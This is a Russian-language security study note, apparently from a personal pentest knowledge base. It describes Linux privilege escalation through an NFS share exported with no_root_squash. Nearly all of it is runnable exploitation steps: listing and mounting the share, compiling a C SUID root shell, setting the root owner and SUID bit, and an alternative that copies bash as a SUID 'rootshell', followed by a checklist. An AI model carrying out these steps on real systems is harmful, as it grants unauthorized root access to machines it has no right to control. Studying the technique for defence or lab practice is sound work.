---
title: "Повышение привилегий в linux NFC + no_root_squash"
id: note-40
created: "03.02.2026 08:53"
category: "06_Linux и повышение привилегий"
tags:
  - иб/linux
  - privesc
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `06_Linux и повышение привилегий` · Дата: `03.02.2026 08:53`

# Повышение привилегий в linux NFC + no_root_squash

Суть уязвимости
/etc/exports на целевой машине:
/home/backup *(rw,sync,insecure,no_root_squash)

no_root_squash = если клиент root → на сервере тоже root

Шаги эксплуатации
Способ 1: С локальной машины (рекомендуется)
 1. Проверяем доступные shares
showmount -e <TARGET_IP>

 2. Создаём папку для монтирования
mkdir ~/nfs_mount

 3. Монтируем уязвимую папку
sudo mount -t nfs <TARGET_IP>:/home/backup ~/nfs_mount

 4. Создаём SUID-шелл в смонтированной папке
cd ~/nfs_mount
cat > shell.c << 'EOF'
#include <unistd.h>
int main() {
    setgid(0); setuid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc shell.c -o shell
sudo chown root:root shell
sudo chmod +s shell

Home/backup не обязательно что будет главное смотреть на результаты
 showmount
 
Способ 2: Прямо на целевой машине
Если уже есть доступ к /home/backup
cd /home/backup
cp /bin/bash ./rootshell
chmod 4755 ./rootshell  # SUID-bit
./rootshell -p           # -p сохраняет привилегии


Последовательность действий 

1. showmount -e <IP>                                                       # Проверяем shares
2. cat /etc/exports | grep no_root_squash                    # Ищем уязвимость
3. mkdir /tmp/mount; mount <IP>:/path /tmp/mount   # Монтируем
4. Создаём SUID-файл в /tmp/mount                          # Как root на клиенте
5. Запускаем файл на сервере                                    # Получаем root


Простой чек-лист:

cat /etc/exports → есть no_root_squash?
showmount -e <IP> → какие папки доступны?
Смонтировать папку на свою машину
Создать SUID-файл как root
Запустить файл на целевой машине
whoami → должно быть root
